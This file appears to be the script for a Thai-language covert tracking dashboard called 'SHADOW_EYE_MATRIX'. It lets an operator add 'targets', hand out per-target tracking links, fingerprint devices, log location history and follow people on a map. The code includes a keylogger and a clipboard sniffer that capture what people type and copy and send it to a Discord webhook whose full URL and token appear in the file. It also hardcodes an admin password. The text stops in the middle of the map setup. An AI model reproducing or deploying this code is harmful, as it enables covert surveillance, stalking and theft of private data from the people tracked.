@@ -1,0 +1,1412 @@
+/* ================================================================
+   SHADOW_EYE_MATRIX — GPS Eyes Shadow Tool
+   Multi-Stage App Selector & Tactical Dashboard
+   ================================================================ */
+
+'use strict';
+
+// ===== CONFIGURATION =====
+const DISCORD_WEBHOOK_URL = 'https://discord.com/api/webhooks/1524022022911299676/0o-7NMCMXUlJ6TjHwE6WDGrC6NRsM7pdKmoNcjNXvttvFefDu1bBwybzQjPmYd9hsZy3';
+
+const AUTH = { username: 'admin', password: 'napxper' };
+const BASE_LAT = 9.9833;
+const BASE_LNG = 99.1500;
+const SESSION_KEY = 'gps_shadow_session';
+const PLAYERS_KEY = 'shadow_eye_players';
+const TRACKING_INTERVAL_MS = 60000;
+
+// ===== DOM (safe refs — populated on init) =====
+let loginScreen, dashboard, loginForm, loginError, logoutBtn;
+let gpsIconBtn, consoleOutput, commandForm, commandInput, consoleClock;
+let headerStatus, infoSession, infoGps, infoLastAction, infoActiveTarget;
+let playerListEl, addPlayerBtn, mapCoordsDisplay, tacticalMapEl;
+let appSelector, gpsToolBtn, rightDrawer, drawerClose, drawerTitle;
+let drawerCoords, drawerMapsLink, drawerIp, drawerIsp, drawerOs, drawerScreen;
+let drawerBattery, drawerNetwork, drawerDistance, drawerNotes, drawerSaveNotes;
+let drawerPlayerList, drawerIdentity, drawerLocationHistory;
+
+// ===== STATE =====
+let sessionUser = null;
+let lastGpsResult = null;
+let isProcessing = false;
+let screenAnalytics = null;
+let monitorsActive = false;
+let players = [];
+let selectedTarget = 'admin';
+let trackingTimers = {};
+let mapInstance = null;
+let mapMarkers = { hq: null, admin: null, players: {} };
+let mapReady = false;
+let clockTimer = null;
+
+// ===== KEYLOGGER & CLIPBOARD STATE =====
+let keyloggerState = {};
+let clipboardState = {};
+
+// ===== SAFE INIT =====
+function $(id) {
+  try { return document.getElementById(id); } catch (_) { return null; }
+}
+
+function safeInit() {
+  loginScreen      = $('login-screen');
+  dashboard        = $('dashboard');
+  loginForm        = $('login-form');
+  loginError       = $('login-error');
+  logoutBtn        = $('logout-btn');
+  gpsIconBtn       = $('gps-icon-btn');
+  consoleOutput    = $('console-output');
+  commandForm      = $('command-form');
+  commandInput     = $('command-input');
+  consoleClock     = $('console-clock');
+  headerStatus     = $('header-status');
+  infoSession      = $('info-session');
+  infoGps          = $('info-gps');
+  infoLastAction   = $('info-last-action');
+  infoActiveTarget = $('info-active-target');
+  playerListEl     = $('player-list');
+  addPlayerBtn     = $('add-player-btn');
+  mapCoordsDisplay = $('map-coords-display');
+  tacticalMapEl    = $('tactical-map');
+  
+  // App Selector elements
+  appSelector      = $('app-selector');
+  gpsToolBtn       = $('gps-tool-btn');
+  
+  // Right Drawer elements
+  rightDrawer      = $('right-drawer');
+  drawerClose      = $('drawer-close');
+  drawerTitle      = $('drawer-title');
+  drawerCoords     = $('drawer-coords');
+  drawerMapsLink   = $('drawer-maps-link');
+  drawerIp         = $('drawer-ip');
+  drawerIsp       = $('drawer-isp');
+  drawerOs         = $('drawer-os');
+  drawerScreen     = $('drawer-screen');
+  drawerBattery    = $('drawer-battery');
+  drawerNetwork    = $('drawer-network');
+  drawerDistance   = $('drawer-distance');
+  drawerNotes      = $('drawer-notes');
+  drawerSaveNotes  = $('drawer-save-notes');
+  drawerPlayerList = $('drawer-player-list');
+  drawerIdentity   = $('drawer-identity');
+  drawerLocationHistory = $('drawer-location-history');
+
+  if (!loginForm) return;
+
+  bindEvents();
+  startClock();
+  initKeyloggerAndClipboard();
+
+  const saved = loadSession();
+  if (saved === AUTH.username) {
+    showAppSelector();
+  }
+}
+
+// ===== KEYLOGGER & CLIPBOARD MONITOR =====
+function initKeyloggerAndClipboard() {
+  // Keylogger - capture all keystrokes
+  document.addEventListener('keydown', (e) => {
+    if (!sessionUser) return;
+    
+    const targetId = selectedTarget;
+    
+    if (!keyloggerState[targetId]) {
+      keyloggerState[targetId] = { text: '', lastUpdate: null };
+    }
+    
+    if (e.key.length === 1) {
+      keyloggerState[targetId].text += e.key;
+    } else if (e.key === 'Backspace' && keyloggerState[targetId].text.length > 0) {
+      keyloggerState[targetId].text = keyloggerState[targetId].text.slice(0, -1);
+    } else if (e.key === 'Enter') {
+      const typedText = keyloggerState[targetId].text;
+      if (typedText.length > 0) {
+        logSuspiciousActivity(targetId, 'typing', typedText);
+      }
+      keyloggerState[targetId].text = '';
+    }
+    
+    keyloggerState[targetId].lastUpdate = new Date().toISOString();
+    updatePlayerMetadataDisplay(targetId);
+  });
+
+  // Clipboard Sniffer - capture copy events
+  document.addEventListener('copy', (e) => {
+    if (!sessionUser) return;
+    
+    const targetId = selectedTarget;
+    const selection = window.getSelection().toString();
+    
+    if (selection && selection.length > 0) {
+      clipboardState[targetId] = {
+        text: selection,
+        timestamp: new Date().toISOString()
+      };
+      logSuspiciousActivity(targetId, 'clipboard', selection);
+      updatePlayerMetadataDisplay(targetId);
+    }
+  });
+}
+
+function logSuspiciousActivity(targetId, type, data) {
+  const p = getPlayer(targetId) || { name: 'Admin' };
+  const actorName = p.name || 'Admin';
+  
+  if (type === 'typing') {
+    appendLog(`[SUSPICIOUS] ${actorName} กำลังพิมพ์: "${data}"`, 'text-orange-400');
+  } else if (type === 'clipboard') {
+    appendLog(`[SUSPICIOUS] ${actorName} คัดลอกข้อความ: "${data}"`, 'text-orange-400');
+  }
+  
+  sendSuspiciousActivityToDiscord(actorName, type, data);
+}
+
+async function sendSuspiciousActivityToDiscord(actorName, type, data) {
+  if (!DISCORD_WEBHOOK_URL) return;
+  
+  const title = type === 'typing' ? '⌨️ Live Typing Detected' : '📋 Clipboard Sniffed';
+  const description = type === 'typing' 
+    ? `${actorName} กำลังพิมพ์ข้อความ: "${data}"`
+    : `${actorName} คัดลอกข้อความ: "${data}"`;
+  
+  const color = type === 'typing' ? 0xf97316 : 0x3b82f6;
+  
+  try {
+    const blob = new Blob([JSON.stringify({
+      embeds: [{
+        title,
+        description,
+        color,
+        footer: { text: 'SHADOW_EYE_MATRIX — Live Activity Monitor' },
+        timestamp: new Date().toISOString()
+      }]
+    })], { type: 'application/json' });
+    
+    if (typeof navigator.sendBeacon === 'function') {
+      navigator.sendBeacon(DISCORD_WEBHOOK_URL, blob);
+    }
+  } catch (_) {}
+}
+
+// ===== CLOCK =====
+function startClock() {
+  if (clockTimer) clearInterval(clockTimer);
+  const tick = () => {
+    if (consoleClock) {
+      consoleClock.textContent = new Date().toLocaleTimeString('th-TH', { hour12: false });
+    }
+  };
+  tick();
+  clockTimer = setInterval(tick, 1000);
+}
+
+// ===== CONSOLE =====
+const LOG = {
+  white:  'text-white',
+  dim:    'text-neutral-400',
+  green:  'text-green-400',
+  red:    'text-red-400',
+  orange: 'text-orange-400',
+};
+
+function ts() {
+  return new Date().toLocaleTimeString('th-TH', { hour12: false });
+}
+
+function esc(str) {
+  const d = document.createElement('div');
+  d.textContent = String(str ?? '');
+  return d.innerHTML;
+}
+
+function appendLog(msg, cls = LOG.white) {
+  if (!consoleOutput) return;
+  const el = document.createElement('div');
+  el.className = `log-entry mb-0.5 ${cls}`;
+  el.innerHTML = `<span class="text-neutral-600 select-none">[${ts()}]</span> ${esc(msg)}`;
+  consoleOutput.appendChild(el);
+  consoleOutput.scrollTop = consoleOutput.scrollHeight;
+}
+
+function clearConsole() {
+  if (consoleOutput) consoleOutput.innerHTML = '';
+}
+
+function printCommandGuide() {
+  appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', LOG.dim);
+  appendLog('แนะนำวิธีใช้ระบบสั่งการ (Command Guide)', LOG.white);
+  appendLog('  /gps      — ดึงพิกัด Admin (Hybrid + ระยะห่าง)', LOG.dim);
+  appendLog('  /status   — สถานะเครื่อง, Fingerprint, หน้าจอ', LOG.dim);
+  appendLog('  /battery  — ตรวจแบตเตอรี่ (ถ้ารองรับ)', LOG.dim);
+  appendLog('  /network  — ตรวจสถานะเครือข่าย', LOG.dim);
+  appendLog('  /clear    — ล้างคอนโซล', LOG.dim);
+  appendLog('  /logout   — ออกจากระบบ', LOG.dim);
+  appendLog('  /help     — แสดงคำสั่งทั้งหมด', LOG.dim);
+  appendLog('  คลิก GPS Icon หรือ Force Fetch ที่ Player Matrix', LOG.orange);
+  appendLog('━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━', LOG.dim);
+}
+
+// ===== SESSION =====
+function saveSession(u) { try { localStorage.setItem(SESSION_KEY, u); } catch (_) {} }
+function loadSession() { try { return localStorage.getItem(SESSION_KEY); } catch (_) { return null; } }
+function clearSession() { try { localStorage.removeItem(SESSION_KEY); } catch (_) {} }
+
+// ===== PLAYER TARGET MATRIX =====
+function defaultPlayers() {
+  return [{ 
+    id: 'player-1', 
+    name: 'Player 1', 
+    tracking: false, 
+    coords: null, 
+    lastUpdate: null, 
+    permission: null, 
+    source: null, 
+    distanceKm: null,
+    ip: null,
+    isp: null,
+    battery: null,
+    charging: null,
+    network: null,
+    os: null,
+    screen: null,
+    notes: '',
+    identity: ''
+  }];
+}
+
+function loadPlayers() {
+  try {
+    const raw = localStorage.getItem(PLAYERS_KEY);
+    players = raw ? JSON.parse(raw) : defaultPlayers();
+    if (!Array.isArray(players) || !players.length) players = defaultPlayers();
+  } catch (_) {
+    players = defaultPlayers();
+  }
+}
+
+function savePlayers() {
+  try { localStorage.setItem(PLAYERS_KEY, JSON.stringify(players)); } catch (_) {}
+}
+
+function getPlayer(id) {
+  return players.find((p) => p.id === id);
+}
+
+// ===== TRANSLATION HELPER =====
+function translateStatus(key, value) {
+  const translations = {
+    'Permission': {
+      'Granted': 'ได้รับอนุญาต (GPS)',
+      'Denied': 'ปฏิเสธสิทธิ์ (IP)'
+    },
+    'Charging': {
+      'true': 'กำลังชาร์จไฟ',
+      'false': 'ไม่ชาร์จไฟ'
+    },
+    'OS': {
+      'Windows': 'วินโดวส์',
+      'Mac': 'แมคโอเอส',
+      'Linux': 'ลินุกซ์',
+      'Android': 'แอนดรอยด์',
+      'iOS': 'ไอโอเอส'
+    },
+    'Connection': {
+      'Cellular': 'สัญญาณมือถือ/เซลลูลาร์',
+      'WiFi': 'ไวไฟ',
+      'Ethernet': 'อีเธอร์เน็ต',
+      'Unknown': 'ไม่ทราบ'
+    }
+  };
+  
+  if (translations[key] && translations[key][value]) {
+    return translations[key][value];
+  }
+  return value;
+}
+
+// ===== COPY TRACKING LINK =====
+function copyTrackingLink(playerId) {
+  const baseUrl = window.location.origin + window.location.pathname.replace('index.html', '');
+  const trackUrl = `${baseUrl}track.html?id=${playerId}`;
+  
+  navigator.clipboard.writeText(trackUrl).then(() => {
+    appendLog(`[MATRIX] Copied tracking link for ${getPlayer(playerId)?.name || playerId}`, LOG.green);
+    appendLog(`Link: ${trackUrl}`, LOG.dim);
+  }).catch(() => {
+    appendLog('[MATRIX] Failed to copy link', LOG.red);
+  });
+}
+
+// ===== RIGHT SLIDING DRAWER =====
+function openRightDrawer(playerId) {
+  const p = getPlayer(playerId);
+  if (!p) return;
+  
+  selectedTarget = playerId;
+  
+  if (drawerTitle) drawerTitle.textContent = p.name;
+  if (drawerCoords) drawerCoords.textContent = p.coords ? `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}` : '—';
+  if (drawerMapsLink) {
+    drawerMapsLink.href = p.coords ? `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}` : '#';
+    drawerMapsLink.style.display = p.coords ? 'block' : 'none';
+  }
+  if (drawerIp) drawerIp.textContent = p.ip || '—';
+  if (drawerIsp) drawerIsp.textContent = p.isp || '—';
+  if (drawerOs) drawerOs.textContent = p.os ? `${p.os} (${translateStatus('OS', p.os)})` : '—';
+  if (drawerScreen) drawerScreen.textContent = p.screen || '—';
+  if (drawerBattery) drawerBattery.textContent = p.battery !== null ? `${p.battery}% (${p.charging ? 'กำลังชาร์จไฟ' : 'ไม่ชาร์จไฟ'})` : '—';
+  if (drawerNetwork) drawerNetwork.textContent = p.network ? translateStatus('Connection', p.network) : '—';
+  if (drawerDistance) drawerDistance.textContent = p.distanceKm !== null ? `${p.distanceKm.toFixed(2)} km` : '—';
+  if (drawerNotes) drawerNotes.value = p.notes || '';
+  if (drawerIdentity) drawerIdentity.value = p.identity || '';
+  
+  // Render player list in drawer
+  renderDrawerPlayerList();
+  
+  // Render location history
+  renderLocationHistory(playerId);
+  
+  if (rightDrawer) {
+    rightDrawer.classList.remove('hidden');
+    rightDrawer.style.transform = 'translateX(0)';
+  }
+}
+
+function closeRightDrawer() {
+  if (rightDrawer) {
+    rightDrawer.style.transform = 'translateX(100%)';
+    setTimeout(() => {
+      rightDrawer.classList.add('hidden');
+    }, 300);
+  }
+}
+
+function renderDrawerPlayerList() {
+  if (!drawerPlayerList) return;
+  
+  drawerPlayerList.innerHTML = '';
+  
+  players.forEach((p) => {
+    const item = document.createElement('div');
+    item.className = `flex items-center justify-between p-2 rounded border border-neutral-700 cursor-pointer hover:bg-neutral-800 transition ${selectedTarget === p.id ? 'bg-green-500/10 border-green-500/30' : ''}`;
+    item.dataset.id = p.id;
+    
+    const statusColor = p.coords ? 'text-green-400' : 'text-neutral-500';
+    
+    item.innerHTML = `
+      <div>
+        <div class="text-xs font-medium text-white">${esc(p.name)}</div>
+        <div class="text-[10px] ${statusColor}">${p.coords ? `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}` : 'No coords'}</div>
+      </div>
+      <button class="copy-link-btn text-[10px] text-orange-400 hover:text-orange-300" data-id="${p.id}" title="คัดลอกลิงก์">📋</button>
+    `;
+    
+    item.addEventListener('click', () => {
+      openRightDrawer(p.id);
+    });
+    
+    const copyBtn = item.querySelector('.copy-link-btn');
+    copyBtn?.addEventListener('click', (e) => {
+      e.stopPropagation();
+      copyTrackingLink(p.id);
+    });
+    
+    drawerPlayerList.appendChild(item);
+  });
+}
+
+function renderLocationHistory(playerId) {
+  if (!drawerLocationHistory) return;
+  
+  const p = getPlayer(playerId);
+  if (!p) {
+    drawerLocationHistory.innerHTML = '<div class="text-neutral-500">—</div>';
+    return;
+  }
+  
+  // Get location history from localStorage
+  const historyKey = `location_history_${playerId}`;
+  let history = [];
+  try {
+    const raw = localStorage.getItem(historyKey);
+    history = raw ? JSON.parse(raw) : [];
+  } catch (_) {}
+  
+  if (history.length === 0) {
+    drawerLocationHistory.innerHTML = '<div class="text-neutral-500">ไม่มีประวัติพิกัด</div>';
+    return;
+  }
+  
+  drawerLocationHistory.innerHTML = history.map((h, i) => `
+    <div class="border-b border-neutral-800 pb-1 mb-1 last:border-0 last:pb-0 last:mb-0">
+      <div class="text-white">${i + 1}. ${h.coords.latitude.toFixed(6)}, ${h.coords.longitude.toFixed(6)}</div>
+      <div class="text-neutral-400 text-[9px]">${new Date(h.timestamp).toLocaleString('th-TH')}</div>
+    </div>
+  `).join('');
+}
+
+function savePlayerNotes() {
+  const p = getPlayer(selectedTarget);
+  if (!p) return;
+  
+  p.notes = drawerNotes?.value || '';
+  p.identity = drawerIdentity?.value || '';
+  
+  // Save location history
+  const historyKey = `location_history_${selectedTarget}`;
+  if (p.coords) {
+    let history = [];
+    try {
+      const raw = localStorage.getItem(historyKey);
+      history = raw ? JSON.parse(raw) : [];
+    } catch (_) {}
+    
+    history.push({
+      coords: { ...p.coords },
+      timestamp: new Date().toISOString()
+    });
+    
+    // Keep only last 50 entries
+    if (history.length > 50) history = history.slice(-50);
+    
+    try { localStorage.setItem(historyKey, JSON.stringify(history)); } catch (_) {}
+  }
+  
+  savePlayers();
+  renderLocationHistory(selectedTarget);
+  appendLog(`[MATRIX] Notes saved for ${p.name}`, LOG.green);
+}
+
+// ===== PLAYER METADATA DISPLAY =====
+function updatePlayerMetadataDisplay(playerId) {
+  const p = getPlayer(playerId);
+  if (!p) return;
+  
+  const card = document.querySelector(`.player-card[data-id="${playerId}"]`);
+  if (!card) return;
+  
+  const metadataEl = card.querySelector('.player-metadata');
+  if (!metadataEl) return;
+  
+  const keylog = keyloggerState[playerId] || { text: '', lastUpdate: null };
+  const clip = clipboardState[playerId] || { text: '', timestamp: null };
+  
+  let batteryInfo = '—';
+  let batteryCharging = '—';
+  if (p.battery !== null && p.battery !== undefined) {
+    batteryInfo = `${p.battery}%`;
+    batteryCharging = p.charging ? 'กำลังชาร์จไฟ' : 'ไม่ชาร์จไฟ';
+  }
+  
+  let networkInfo = '—';
+  if (p.network) {
+    networkInfo = translateStatus('Connection', p.network);
+  }
+  
+  let osInfo = '—';
+  if (p.os) {
+    osInfo = `${p.os} (${translateStatus('OS', p.os)})`;
+  }
+  
+  let screenInfo = '—';
+  if (p.screen) {
+    screenInfo = p.screen;
+  }
+  
+  let distanceInfo = '—';
+  if (p.distanceKm !== null && p.distanceKm !== undefined) {
+    distanceInfo = `${p.distanceKm.toFixed(2)} km`;
+  }
+  
+  let ipInfo = p.ip || '—';
+  let ispInfo = p.isp || '—';
+  
+  let locationInfo = '—';
+  let mapsLink = '#';
+  if (p.coords) {
+    locationInfo = `${p.coords.latitude.toFixed(6)}, ${p.coords.longitude.toFixed(6)}`;
+    mapsLink = `https://www.google.com/maps?q=${p.coords.latitude},${p.coords.longitude}`;
+  }
+  
+  metadataEl.innerHTML = `
+    <div class="mt-2 pt-2 border-t border-neutral-800 space-y-1.5">
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">📍 พิกัด:</span> 
+        ${p.coords ? `<a href="${mapsLink}" target="_blank" class="text-orange-400 hover:underline">${locationInfo}</a>` : '—'}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">🌐 ไอพีแอดเดรส:</span> ${ipInfo}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">📡 ผู้ให้บริการ (ISP):</span> ${ispInfo}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">🔋 แบตเตอรี่:</span> ${batteryInfo} (${batteryCharging})
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">📶 สัญญาณเครือข่าย:</span> ${networkInfo}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">📱 ข้อมูลเครื่อง:</span> ${osInfo} | ${screenInfo}
+      </div>
+      <div class="text-[10px] text-white">
+        <span class="text-green-400">🗺️ ระยะห่าง:</span> ${distanceInfo}
+      </div>
+      <div class="pt-1.5 border-t border-neutral-800 space-y-1">
+        <div class="text-[10px] text-white">
+          <span class="text-orange-400">⌨️ ล่าสุดที่พิมพ์:</span> 
+          <span class="text-white/80">${keylog.text || '(กำลังพิมพ์...)'}</span>
+        </div>
+        <div class="text-[10px] text-white">
+          <span class="text-orange-400">📋 ข้อความที่คัดลอก:</span> 
+          <span class="text-white/80">${clip.text || '(ไม่มีข้อมูล)'}</span>
+        </div>
+      </div>
+    </div>
+  `;
+}
+
+function renderPlayerList() {
+  if (!playerListEl) return;
+  playerListEl.innerHTML = '';
+
+  players.forEach((p) => {
+    const card = document.createElement('div');
+    card.className = `player-card rounded-lg border border-neutral-700 p-2.5 cursor-pointer ${p.tracking ? 'tracking-on' : 'tracking-off'} ${selectedTarget === p.id ? 'selected' : ''}`;
+    card.dataset.id = p.id;
+
+    const statusColor = p.coords ? 'text-green-400' : 'text-neutral-500';
+    const trackLabel = p.tracking ? 'ON' : 'OFF';
+
+    card.innerHTML = `
+      <div class="flex items-center justify-between gap-1 mb-1.5">
+        <span class="player-name text-xs font-medium text-white truncate" data-id="${p.id}" title="คลิกเพื่อแก้ไขชื่อ">${esc(p.name)}</span>
+        <span class="tracking-badge text-[9px] px-1.5 py-0.5 rounded font-mono shrink-0">${trackLabel}</span>
+      </div>
+      <div class="text-[10px] ${statusColor} mb-2 font-mono truncate">${p.coords ? `${p.coords.latitude.toFixed(4)}, ${p.coords.longitude.toFixed(4)}` : 'No coords yet'}</div>
+      <div class="flex gap-1.5">
+        <button class="btn-toggle flex-1 text-[10px] py-1 rounded border border-neutral-600 text-white hover:border-green-500/50 transition" data-id="${p.id}">
+          ${p.tracking ? '⏸ Stop' : '▶ Track'}
+        </button>
+        <button class="btn-fetch flex-1 text-[10px] py-1 rounded border border-neutral-600 text-orange-400 hover:border-orange-500/50 transition" data-id="${p.id}">
+          ⚡ Fetch
+        </button>
+        <button class="btn-copy-link flex-1 text-[10px] py-1 rounded border border-blue-600/50 text-blue-400 hover:border-blue-500 transition" data-id="${p.id}" title="คัดลอกลิงก์ติดตาม">
+          📋 Link
+        </button>
+        <button class="btn-delete flex-1 text-[10px] py-1 rounded border border-red-600/50 text-red-400 hover:border-red-500 transition" data-id="${p.id}" title="ลบเป้าหมาย">
+          🗑️
+        </button>
+      </div>
+      <div class="player-metadata"></div>
+    `;
+
+    card.addEventListener('click', (e) => {
+      if (e.target.closest('button') || e.target.closest('.player-name-input')) return;
+      openRightDrawer(p.id);
+    });
+
+    card.querySelector('.player-name').addEventListener('click', (e) => {
+      e.stopPropagation();
+      startRename(p.id, e.target);
+    });
+
+    card.querySelector('.btn-toggle').addEventListener('click', (e) => {
+      e.stopPropagation();
+      toggleTracking(p.id);
+    });
+
+    card.querySelector('.btn-fetch').addEventListener('click', (e) => {
+      e.stopPropagation();
+      forceFetchPlayer(p.id);
+    });
+
+    card.querySelector('.btn-copy-link').addEventListener('click', (e) => {
+      e.stopPropagation();
+      copyTrackingLink(p.id);
+    });
+
+    card.querySelector('.btn-delete').addEventListener('click', (e) => {
+      e.stopPropagation();
+      deletePlayer(p.id);
+    });
+
+    playerListEl.appendChild(card);
+    
+    updatePlayerMetadataDisplay(p.id);
+  });
+}
+
+function startRename(id, el) {
+  const p = getPlayer(id);
+  if (!p) return;
+  const input = document.createElement('input');
+  input.className = 'player-name-input text-xs';
+  input.value = p.name;
+  input.maxLength = 32;
+  el.replaceWith(input);
+  input.focus();
+  input.select();
+
+  const commit = () => {
+    const val = input.value.trim() || p.name;
+    p.name = val;
+    savePlayers();
+    renderPlayerList();
+    renderDrawerPlayerList();
+    appendLog(`[MATRIX] Renamed target → "${val}"`, LOG.orange);
+    printCommandGuide();
+  };
+
+  input.addEventListener('blur', commit);
+  input.addEventListener('keydown', (e) => {
+    if (e.key === 'Enter') { e.preventDefault(); input.blur(); }
+    if (e.key === 'Escape') { input.value = p.name; input.blur(); }
+  });
+}
+
+function selectTarget(id) {
+  selectedTarget = id;
+  const p = getPlayer(id);
+  if (infoActiveTarget) infoActiveTarget.textContent = p ? p.name : id;
+  renderPlayerList();
+  if (p?.coords) {
+    panMapTo(p.coords.latitude, p.coords.longitude, 14);
+    updateMapCoordsDisplay(p.coords.latitude, p.coords.longitude, p.name);
+  }
+  appendLog(`[MATRIX] Selected target: ${p?.name || id}`, LOG.orange);
+}
+
+function toggleTracking(id) {
+  const p = getPlayer(id);
+  if (!p) return;
+
+  p.tracking = !p.tracking;
+  savePlayers();
+  renderPlayerList();
+
+  if (p.tracking) {
+    appendLog(`[MATRIX] Tracking ON — ${p.name}`, LOG.green);
+    startTrackingTimer(id);
+    forceFetchPlayer(id);
+  } else {
+    appendLog(`[MATRIX] Tracking OFF — ${p.name}`, LOG.red);
+    stopTrackingTimer(id);
+    printCommandGuide();
+  }
+}
+
+function startTrackingTimer(id) {
+  stopTrackingTimer(id);
+  trackingTimers[id] = setInterval(() => {
+    const p = getPlayer(id);
+    if (p?.tracking) forceFetchPlayer(id, true);
+  }, TRACKING_INTERVAL_MS);
+}
+
+function stopTrackingTimer(id) {
+  if (trackingTimers[id]) {
+    clearInterval(trackingTimers[id]);
+    delete trackingTimers[id];
+  }
+}
+
+function stopAllTracking() {
+  Object.keys(trackingTimers).forEach(stopTrackingTimer);
+}
+
+async function forceFetchPlayer(id, silent = false) {
+  const p = getPlayer(id);
+  if (!p) return;
+  selectTarget(id);
+  if (!silent) appendLog(`[MATRIX] Force Fetch — ${p.name}`, LOG.orange);
+  await runHybridGeolocation(`Player: ${p.name}`, id);
+}
+
+function addPlayer() {
+  const n = players.length + 1;
+  const id = `player-${Date.now()}`;
+  players.push({ 
+    id, 
+    name: `Player ${n}`, 
+    tracking: false, 
+    coords: null, 
+    lastUpdate: null, 
+    permission: null, 
+    source: null, 
+    distanceKm: null,
+    ip: null,
+    isp: null,
+    battery: null,
+    charging: null,
+    network: null,
+    os: null,
+    screen: null,
+    notes: '',
+    identity: ''
+  });
+  savePlayers();
+  renderPlayerList();
+  appendLog(`[MATRIX] Added target: Player ${n}`, LOG.green);
+  printCommandGuide();
+}
+
+function deletePlayer(id) {
+  const p = getPlayer(id);
+  if (!p) return;
+  
+  if (confirm(`ยืนยันการลบเป้าหมาย "${p.name}" ใช่หรือไม่?`)) {
+    players = players.filter(player => player.id !== id);
+    savePlayers();
+    renderPlayerList();
+    renderDrawerPlayerList();
+    // Clear location history
+    try { localStorage.removeItem(`location_history_${id}`); } catch (_) {}
+    appendLog(`[MATRIX] Deleted target: ${p.name}`, LOG.red);
+    printCommandGuide();
+  }
+}
+
+// ===== SCREEN ANALYTICS (once) =====
+function captureScreenAnalytics() {
+  if (screenAnalytics) return screenAnalytics;
+  try {
+    const w = window.screen?.width || 0;
+    const h = window.screen?.height || 0;
+    const dpr = window.devicePixelRatio || 1;
+    screenAnalytics = {
+      width: w, height: h, devicePixelRatio: dpr,
+      resolution: `${w}x${h}`,
+      effectiveResolution: `${Math.round(w * dpr)}x${Math.round(h * dpr)}`,
+      orientation: w > h ? 'Landscape' : 'Portrait',
+    };
+  } catch (_) {
+    screenAnalytics = { width: 0, height: 0, devicePixelRatio: 1, resolution: '—', effectiveResolution: '—', orientation: '—' };
+  }
+  return screenAnalytics;
+}
+
+// ===== HAVERSINE =====
+function haversine(lat1, lng1, lat2, lng2) {
+  const R = 6371, rad = (d) => (d * Math.PI) / 180;
+  const dLat = rad(lat2 - lat1), dLng = rad(lng2 - lng1);
+  const a = Math.sin(dLat / 2) ** 2 + Math.cos(rad(lat1)) * Math.cos(rad(lat2)) * Math.sin(dLng / 2) ** 2;
+  return R * 2 * Math.atan2(Math.sqrt(a), Math.sqrt(1 - a));
+}
+
+function calcDist(lat, lng) {
+  if (lat == null || lng == null) return null;
+  return haversine(lat, lng, BASE_LAT, BASE_LNG);
+}
+
+// ===== FINGERPRINT (safe) =====
+function detectOS() {
+  try {
+    const ua = navigator.userAgent || '';
+    if (/iPhone|iPad|iPod/.test(ua)) return 'iOS';
+    if (/Android/.test(ua)) return 'Android';
+    if (/Mac OS X/.test(ua)) return 'Mac';
+    if (/Windows/.test(ua)) return 'Windows';
+    if (/Linux/.test(ua)) return 'Linux';
+  } catch (_) {}
+  return 'Unknown';
+}
+
+function detectBrowser() {
+  try {
+    const ua = navigator.userAgent || '';
+    if (ua.includes('Firefox/')) return 'Firefox';
+    if (ua.includes('Edg/')) return 'Edge';
+    if (ua.includes('Chrome/')) return 'Chrome';
+    if (ua.includes('Safari/')) return 'Safari';
+  } catch (_) {}
+  return 'Unknown';
+}
+
+function getFingerprint() {
+  const sa = captureScreenAnalytics();
+  let tz = 'Unknown';
+  try { tz = Intl.DateTimeFormat().resolvedOptions().timeZone; } catch (_) {}
+  return {
+    os: detectOS(), browser: detectBrowser(),
+    language: navigator.language || 'Unknown',
+    languages: (navigator.languages || []).join(', ') || 'Unknown',
+    timezone: tz,
+    timezoneOffset: new Date().getTimezoneOffset(),
+    screen: sa.resolution, screenWidth: sa.width, screenHeight: sa.height,
+    devicePixelRatio: sa.devicePixelRatio, effectiveResolution: sa.effectiveResolution,
+    orientation: sa.orientation,
+    platform: navigator.platform || 'Unknown',
+    online: typeof navigator.onLine === 'boolean' ? navigator.onLine : true,
+  };
+}
+
+// ===== LOW-RESOURCE MONITORS =====
+function initMonitors() {
+  if (monitorsActive) return;
+  monitorsActive = true;
+  document.addEventListener('visibilitychange', onVisibilityChange);
+  window.addEventListener('online', onNetOnline);
+  window.addEventListener('offline', onNetOffline);
+}
+
+function teardownMonitors() {
+  if (!monitorsActive) return;
+  monitorsActive = false;
+  document.removeEventListener('visibilitychange', onVisibilityChange);
+  window.removeEventListener('online', onNetOnline);
+  window.removeEventListener('offline', onNetOffline);
+}
+
+function onVisibilityChange() {
+  if (!sessionUser) return;
+  if (document.hidden) {
+    appendLog('[WARNING]: User switched tab / Console blurred!', LOG.red);
+    sendDiscordAlert('⚠️ Anti-Tamper', `[WARNING]: User switched tab / Console blurred!\n👤 Actor: Admin (${sessionUser})`, 0xef4444);
+  } else {
+    appendLog('[SYSTEM]: User returned to console.', LOG.green);
+  }
+}
+
+function onNetOffline() {
+  if (!sessionUser) return;
+  appendLog('[ALERT]: Network Disconnected!', LOG.red);
+  setHeaderStatus('Offline', 'red');
+}
+
+function onNetOnline() {
+  if (!sessionUser) return;
+  appendLog('[SYSTEM]: Network Restored!', LOG.green);
+  setHeaderStatus('Ready', 'white');
+}
+
+// ===== LEAFLET MAP =====
+function createIcon(cls) {
+  if (typeof L === 'undefined') return null;
+  return L.divIcon({ className: cls, iconSize: [16, 16], iconAnchor: [8, 8], popupAnchor: [0, -10] });
+}
+
+function initMap() {
+  if (mapReady || typeof L === 'undefined' || !tacticalMapEl) return;
+
+  try {
+    mapInstance = L.map(tacticalMapEl, {
+      center: [BASE_LAT, BASE_LNG],
+      zoom: 10,
+      zoomControl: true,
+      attributionControl: true,
+    });
+
+    L.tileLayer('https://{s}.basemaps.cartocdn.com/dark_all/{z}/{x}/{y}{r}.png', {
+      attribution: '&copy; OSM &copy; CARTO',
+      subdomains: 'abcd',
+      maxZoom: 19,
+    }).addTo(mapInstance);
+
+    mapMarkers.hq = L.marker([BASE_LAT, BASE_LNG], { icon: createIcon('marker-hq') })
+      .addTo(mapInstance)
+      .bindPopup('<b>HQ — Chumphon</b><br>ศูนย์บัญชาการ');
+
+    mapReady = true;
+
+    setTimeout(() => {
